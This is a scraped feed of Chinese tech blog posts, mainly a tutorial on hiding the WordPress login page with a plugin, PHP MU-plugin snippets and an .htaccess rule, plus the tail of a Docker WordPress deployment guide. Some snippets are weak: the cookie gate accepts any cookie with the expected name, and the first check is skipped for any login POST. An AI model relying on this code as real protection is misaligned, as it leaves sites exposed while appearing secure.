<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50cf076ac09043498b001211719fb9c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=jDVRZC4ZeHT4P%2FJwNk%2FlGKdoLqI%3D" alt="image.png" loading="lazy"/></p>
<p>通过GMSSH的本地端视图，如上图所示，可以观察到服务器上的容器分布情况，进一步证实了工具操作的同步性。</p>
<p>为了确保博客能正常存储数据，需要进入数据库创建一个专用库。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2d37afe30f544109d807bae36c12778~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=h64Mu3BVc2j3gNrHXaRxAk9wE6w%3D" alt="image.png" loading="lazy"/></p>
<p>点击容器右侧的终端图标。上图展示了直接在网页端通过Shell进入容器内部的操作。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17aaacf4ba01494b987eb02d17658e04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=itaDYrOGwBRXkDkv4t4N68nG8bk%3D" alt="image.png" loading="lazy"/></p>
<p>在容器内部输入 <code>mysql -uroot -p</code> 命令，并填入之前设定的密码。如上图所示，成功进入MySQL交互命令行。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8328104eea884c8a9774fd856d7b83ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=iMd031FdsrmrnCMwNAHUYfgIkCU%3D" alt="image.png" loading="lazy"/></p>
<p>执行 <code>create database test;</code> 语句。上图反馈了数据库创建成功的信息。</p>
<p>此时，数据库环境已准备就绪。</p>
<p>接下来拉取并配置WordPress镜像。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb8aee37319f4ed3a04b8f7ee516ce6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=X1yjjIHbpMBHamTwzUnGRe9x2xk%3D" alt="image.png" loading="lazy"/></p>
<p>在上图的应用搜索框中定位到WordPress官方镜像。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad590d064644aa19315c6bd63a6ceaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=648C2dtk3x%2FAed3eaEbUIopBMPI%3D" alt="image.png" loading="lazy"/></p>
<p>进行关键参数配置。如上图所示，将数据库地址指向服务器IP，数据库名填入 <code>test</code>，并匹配对应的用户名与密码。这一步决定了应用与数据库之间的通讯能否调通。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf8f77e84cb545559fddae7dea422d2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=wMHL5GFKtvs42zlQbHp6Pbt70VA%3D" alt="image.png" loading="lazy"/></p>
<p>确认无误后点击运行，系统开始自动化部署流程。上图展示了拉取镜像并编排容器的过程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2d0dbd85cab47c2a8d8abe1d7d33836~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=qo6f9YXltvXJEpKyv75M3ft%2BYUs%3D" alt="image.png" loading="lazy"/></p>
<p>当看到“运行中”状态后，点击立即访问。如上图所示，如果此时遇到连接超时，需检查10044（本例中设置的端口）是否在防火墙中开放。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fc60092d88a4fb393c680af9996e90f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=cUlKNarMKdwdXun2cBCEQxFl0%2Fc%3D" alt="image.png" loading="lazy"/></p>
<p>成功进入WordPress初始化安装页。上图展示了语言选择与站点基本信息的填写流程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76d9e978d39c40f7859ffb90a0a43f7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=w6oU1Ym57U0987VsyaXXaK5eD4o%3D" alt="image.png" loading="lazy"/></p>
<p>片刻后，系统提示WordPress安装成功。上图展示了安装完成的反馈界面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/548bee8d07404effb9c40cc235b376c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=k9q4eYoYMfiUvJvgEecAhN%2BQeDc%3D" alt="image.png" loading="lazy"/></p>
<p>通过管理员账号登录后台。上图显示了功能齐全的WordPress管理面板，至此，博客系统已完全由GMSSH引导并部署在Docker环境中。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ede924f00c3464a88d934c5c437f144~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=ig4Ru6vogkoZVjv1ec9%2FUtqF8Us%3D" alt="image.png" loading="lazy"/></p>
<p>发布一篇测试文章。如上图所示，文章成功在前端展示，这标志着应用层、逻辑层与数据库层之间的数据链路已完全打通。</p>
<p>综上所述，GMSSH不仅提升了服务器基础运维的便捷性，更通过其强大的可视化Docker管理模块，极大地加速了复杂应用的部署周期。无论是日常的资源维护，还是项目级的环境搭建，它都展现出了高效、安全、直观的独特优势。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WordPress如何隐藏后台登陆网址]]></title>    <link>https://juejin.cn/post/7591816944728768548</link>    <guid>https://juejin.cn/post/7591816944728768548</guid>    <pubDate>2026-01-06T06:10:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591816944728768548" data-draft-id="7591767753850912810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WordPress如何隐藏后台登陆网址"/> <meta itemprop="keywords" content="WordPress,安全"/> <meta itemprop="datePublished" content="2026-01-06T06:10:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="A小辣椒"/> <meta itemprop="url" content="https://juejin.cn/user/4150009734111123"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WordPress如何隐藏后台登陆网址
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4150009734111123/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    A小辣椒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:10:26.000Z" title="Tue Jan 06 2026 06:10:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多初学者认为设置了复杂的密码就安全了，但黑客通常会使用自动化脚本通过默认的路径（如 <code>wp-admin</code>）不断尝试暴力破解。<strong>WPS Hide Login</strong> 的作用就是把这个“大门”藏起来，让机器人连门都找不到。</p>
<blockquote>
<p><strong>核心提示：</strong> 隐藏后台地址（Security by Obscurity）虽然不是网络安全的全部，但它是抵御 99% 自动化扫描的第一道防线。</p>
</blockquote>
<h2 data-id="heading-0">WPS Hide Login插件</h2>
<p>登录你的 WordPress 后台，在左侧菜单点击 <strong>插件 &gt; 安装插件</strong>。在搜索框输入 <code>WPS Hide Login</code>，并且下载WPS Hide Login。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0384d435f6345d298e653e64556b583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQeWwj-i-o-akkg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284626&amp;x-signature=JoGQrcTz7BE0ddAcij9mMBHpPpg%3D" alt="image.png" loading="lazy"/></p>
<p>激活后，插件会自动跳转到设置页面（你也可以在 <strong>设置 &gt; WPS Hide Login</strong> 页面最下方找到它）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e947c0036d6a47f6b7a19fdd08ff606d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQeWwj-i-o-akkg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284626&amp;x-signature=u2W0fUbF4JHbypCAIEcAKFFgU9w%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fe7abb0932541858d71893ea4cc24a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQeWwj-i-o-akkg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284626&amp;x-signature=qtFnRQTvkqSwuuAdW%2FeWbUBUtNI%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>登录地址 (Login URL)：删掉默认的 <code>login</code>，改成一个只有你自己知道的词。别用 <code>admin</code>、<code>webmaster</code>、<code>mima</code> 这种好猜的词。建议用拼音、缩写或短句。</li>
<li>. 重定向地址 (Redirection URL)：当别人尝试访问原来的 <code>wp-admin</code> 或 <code>wp-login.php</code> 时，网站会展示404</li>
</ul>
<p>保存并备份你的地址</p>
<p>点击 <strong>保存更改</strong>。将你的新登录地址添加到<strong>浏览器收藏夹</strong>，或者记在手机备忘录里。例如：<code>https://xxxx.com/你的秘密词汇/</code>, 退出登录，或者开一个浏览器的“无痕模式”，尝试用旧地址进入（看是否显示 404），再用新地址进入（确认能否成功打开登录窗）。</p>
<h2 data-id="heading-1">MU插件</h2>
<p>MU-Plugins 比普通插件更强大，它们位于 <code>/wp-content/mu-plugins/</code> 目录中，<strong>不需要激活就会自动运行</strong>，且无法在后台被禁用或删除，非常适合存放安全代码。</p>
<ul>
<li>
<p>通过 FTP 或主机管理面板进入 <code>/wp-content/</code> 目录。</p>
</li>
<li>
<p>如果不存在 <code>mu-plugins</code> 文件夹，请新建一个。</p>
</li>
<li>
<p>将 <code>my-security.php</code> 上传到 <code>/wp-content/mu-plugins/</code>。</p>
</li>
</ul>
<p>方案一：高阶环境伪装（Nginx 欺骗流）
<strong>核心逻辑：</strong> 如果访问者没有携带正确的“双重暗号”，网站将返回一个完美的 <strong>Nginx 404</strong> 页面，并修改 Header 信息，让黑客工具误以为该路径不存在。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*
  Plugin Name: Perfect Nginx Deception
  Description: 伪装成 Nginx 404 错误并拦截非授权登录请求
*/</span>

<span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">'login_init'</span>, <span class="hljs-string">'perfect_nginx_deception'</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">perfect_nginx_deception</span>(<span class="hljs-params"/>)</span>{
    <span class="hljs-comment">// 1. 定义白名单动作：允许正常流程（如注销、找回密码）不被拦截</span>
    <span class="hljs-variable">$allowed_actions</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'logout'</span>, <span class="hljs-string">'lostpassword'</span>, <span class="hljs-string">'rp'</span>, <span class="hljs-string">'resetpass'</span>);
    <span class="hljs-variable">$current_action</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>] : <span class="hljs-string">''</span>;

    <span class="hljs-comment">// 2. 验证暗号：访问地址必须包含 /wp-login.php?k=Vp9_x2&amp;auth=true</span>
    <span class="hljs-variable">$is_valid</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'k'</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'k'</span>] === <span class="hljs-string">'Vp9_x2'</span>) &amp;&amp; 
                (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'auth'</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'auth'</span>] === <span class="hljs-string">'true'</span>);

    <span class="hljs-comment">// 3. 执行拦截逻辑</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'log'</span>]) &amp;&amp; !<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$current_action</span>, <span class="hljs-variable">$allowed_actions</span>) &amp;&amp; !<span class="hljs-variable">$is_valid</span>) {
        
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ob_get_length</span>()) <span class="hljs-title function_ invoke__">ob_clean</span>(); <span class="hljs-comment">// 清除缓冲防止信息泄露</span>

        <span class="hljs-title function_ invoke__">status_header</span>(<span class="hljs-number">404</span>); <span class="hljs-comment">// 发送标准 404 状态码</span>
        
        <span class="hljs-comment">// 伪装 HTTP 响应头</span>
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type: text/html; charset=utf-8"</span>);
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"X-Powered-By: nginx"</span>); 
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Cache-Control: no-cache, no-store, must-revalidate"</span>);
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Pragma: no-cache"</span>);
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Expires: 0"</span>);

        <span class="hljs-comment">// 输出 Nginx 风格的 404 页面</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;html&gt;
&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body bgcolor="white"&gt;
&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;'</span>;
        <span class="hljs-keyword">exit</span>();
    }
}
</code></pre>
<p>方案二：动态时间暗号（过期失效流）</p>
<p><strong>核心逻辑：</strong> 登录地址携带的参数是基于“当前日期 + 盐值”生成的 MD5 哈希。这意味着即使地址泄露，第二天也会失效。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*
  Plugin Name: Dynamic Login Protection
  Description: 基于日期生成的动态登录暗号
*/</span>

<span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">'login_enqueue_scripts'</span>, <span class="hljs-string">'dynamic_login_protection'</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dynamic_login_protection</span>(<span class="hljs-params"/>)</span>{
    <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">'Asia/Shanghai'</span>);
    
    <span class="hljs-comment">// 生成基于日期的哈希值（取前6位）</span>
    <span class="hljs-comment">// 盐值 'YourSalt' 请自行修改</span>
    <span class="hljs-variable">$correct_token</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">'Y-m-d'</span>) . <span class="hljs-string">'YourSalt'</span>), <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);

    <span class="hljs-comment">// 访问示例：wp-login.php?key=xxxxxx</span>
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key'</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key'</span>] !== <span class="hljs-variable">$correct_token</span>) {
        <span class="hljs-title function_ invoke__">wp_redirect</span>(<span class="hljs-title function_ invoke__">home_url</span>()); <span class="hljs-comment">// 错误则跳转到首页</span>
        <span class="hljs-keyword">exit</span>();
    }
}
</code></pre>
<p>方案三：Cookie 门禁（前置验证流）
<strong>核心逻辑：</strong> 类似于“两步验证”。管理员必须先访问一个特殊的 URL（例如 <code>yourdomain.com/unlock.php</code>）来植入一个 Cookie，之后才能打开 <code>wp-login.php</code>。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*
  Plugin Name: Cookie Login Protection
  Description: 必须持有特定的身份 Cookie 才能访问登录页
*/</span>

<span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">'login_init'</span>, <span class="hljs-string">'cookie_login_protection'</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cookie_login_protection</span>(<span class="hljs-params"/>)</span>{
    <span class="hljs-comment">// 如果没有检测到名为 access_allowed 的 Cookie，则禁止访问</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'access_allowed'</span>])) {
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'HTTP/1.1 403 Forbidden'</span>);
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Access Denied: Please authenticate first.'</span>);
    }
}
</code></pre>
<p>方案三：.htaccess 物理封锁
即使有上述代码，文件 <code>wp-login.php</code> 依然存在于磁盘。在 Apache 服务器中，可以在 <code>.htaccess</code> 中加入以下代码，实现从服务器层面直接拦截</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment"># 在 .htaccess 中添加</span>
&lt;Files <span class="hljs-string">"wp-login.php"</span>&gt;
    RewriteEngine On
    <span class="hljs-comment"># 只有当查询字符串匹配 your_secret_key=your_secret_value 时才允许访问</span>
    RewriteCond %{QUERY_STRING} !^your_secret_key=your_secret_value$
    <span class="hljs-comment"># 其余所有请求全部跳转到 404 页面</span>
    RewriteRule ^(.*)$ https:<span class="hljs-comment">//%{HTTP_HOST}/404 [L,R=301]</span>
&lt;/Files&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jinja2 详细使用文档（配合wkhtmltoimage生成html图片）]]></title>    <link>https://juejin.cn/post/7592017365145911336</link>    <guid>https://juejin.cn/post/7592017365145911336</guid>    <pubDate>2026-01-06T06:33:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592017365145911336" data-draft-id="7591778827308908584" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jinja2 详细使用文档（配合wkhtmltoimage生成html图片）"/> <meta itemprop="keywords" content="前端,Python"/> <meta itemprop="datePublished" content="2026-01-06T06:33:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="red润"/> <meta itemprop="url" content="https://juejin.cn/user/372051848729127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jinja2 详细使用文档（配合wkhtmltoimage生成html图片）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/372051848729127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    red润
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:33:04.000Z" title="Tue Jan 06 2026 06:33:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
